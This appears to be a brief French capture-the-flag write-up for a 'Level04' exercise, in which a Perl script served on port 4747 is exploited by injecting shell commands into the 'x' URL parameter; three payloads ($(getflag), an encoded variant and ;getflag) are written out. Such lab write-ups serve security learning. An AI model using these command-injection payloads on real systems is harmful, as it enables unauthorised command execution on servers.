# Level04

---

- On trouve un fichier "level04.pl" qui est un fichier ecrit en perl et qui vas necessiter un acces via resaux.

- On trouve effectivement la ligne "localhost:4747".

- On peut lancer l'url suivant pour obtenir le flag:
>	- <Target_IP>:4747/?x=$(getflag)
>	- curl 127.0.0.1:4747?x=%2F%3Fx%3D%24%28getflag%29
>	- curl 127.0.0.1:4747?x=%3Bgetflag

